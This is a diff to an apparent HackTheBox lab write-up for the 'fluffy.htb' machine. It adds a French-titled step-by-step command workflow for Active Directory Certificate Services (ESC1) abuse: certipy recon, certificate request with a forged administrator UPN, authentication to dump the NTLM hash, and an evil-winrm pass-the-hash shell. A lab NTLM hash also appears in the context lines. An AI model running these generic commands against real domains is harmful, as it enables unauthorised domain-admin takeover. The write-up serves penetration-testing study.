@@ -95,3 +95,19 @@ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69
 [*] Got hash for 'administrator@fluffy.htb':
 aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
+
+```bash
+Résumé du workflow en une ligne de commande par étape
+bash
+# 1. Recon
+certipy find -u 'user@domain' -p 'pass' -dc-ip <dc_ip> -vulnerable -stdout
+
+# 2. Exploit (exemple ESC1)
+certipy req -u 'user@domain' -p 'pass' -ca 'CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain'
+
+# 3. Auth
+certipy auth -pfx 'administrator.pfx' -dc-ip <dc_ip>
+
+# 4. Post-exploit
+evil-winrm -i <target_ip> -u administrator -H '<ntlm_hash>'
+```
